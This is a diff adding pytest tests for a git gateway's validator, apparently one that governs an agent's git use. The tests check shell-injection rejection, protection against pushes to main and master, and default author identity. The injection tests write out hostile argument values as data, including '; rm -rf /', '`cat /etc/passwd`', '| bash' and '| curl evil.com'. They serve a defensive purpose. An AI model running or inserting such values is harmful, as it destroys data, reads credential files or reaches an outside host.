@@ -7,6 +7,9 @@ import pytest
 from app.modules.git_gateway.service import (
     ALLOWED_OPERATIONS,
     BLOCKED_PATTERNS,
+    DEFAULT_GIT_AUTHOR_EMAIL,
+    DEFAULT_GIT_AUTHOR_NAME,
+    SHELL_INJECTION_PATTERNS,
     GitOperationForbidden,
     redact_output,
     validate_operation,
@@ -89,3 +92,61 @@ class TestRedaction:
 
     def test_empty_string(self) -> None:
         assert redact_output("") == ""
+
+
+class TestShellInjection:
+    def test_command_substitution_rejected(self) -> None:
+        with pytest.raises(GitOperationForbidden, match="injection"):
+            validate_operation("commit", ["-m", "$(whoami)"])
+
+    def test_semicolon_rm_rejected(self) -> None:
+        with pytest.raises(GitOperationForbidden, match="injection"):
+            validate_operation("log", ["--format; rm -rf /"])
+
+    def test_backtick_injection_rejected(self) -> None:
+        with pytest.raises(GitOperationForbidden, match="injection"):
+            validate_operation("commit", ["-m", "`cat /etc/passwd`"])
+
+    def test_pipe_malicious_rejected(self) -> None:
+        with pytest.raises(GitOperationForbidden, match="injection"):
+            validate_operation("log", ["--format | bash"])
+
+    def test_pipe_curl_rejected(self) -> None:
+        with pytest.raises(GitOperationForbidden, match="injection"):
+            validate_operation("log", ["--format | curl evil.com"])
+
+    def test_normal_pipe_not_rejected(self) -> None:
+        # "grep" is not in the malicious list, and no other pattern matches
+        validate_operation("log", ["--format", "oneline"])  # no pipe at all
+
+
+class TestDefaultBranchPushProtection:
+    def test_push_main_rejected(self) -> None:
+        with pytest.raises(GitOperationForbidden, match="protected branch"):
+            validate_operation("push", ["origin", "main"])
+
+    def test_push_master_rejected(self) -> None:
+        with pytest.raises(GitOperationForbidden, match="protected branch"):
+            validate_operation("push", ["origin", "master"])
+
+    def test_push_feature_branch_allowed(self) -> None:
+        validate_operation("push", ["origin", "feature-branch"])  # should not raise
+
+    def test_push_main_as_part_of_name_allowed(self) -> None:
+        # "maintain" should NOT be blocked — exact match only
+        validate_operation("push", ["origin", "maintain"])
+
+    def test_push_no_args_allowed(self) -> None:
+        # bare push with no branch args is fine
+        validate_operation("push", [])
+
+    def test_push_origin_only_allowed(self) -> None:
+        validate_operation("push", ["origin"])
+
+
+class TestGitIdentityDefaults:
+    def test_default_name(self) -> None:
+        assert DEFAULT_GIT_AUTHOR_NAME == "SillyHub Agent"
+
+    def test_default_email(self) -> None:
+        assert DEFAULT_GIT_AUTHOR_EMAIL == "agent@sillyhub.local"
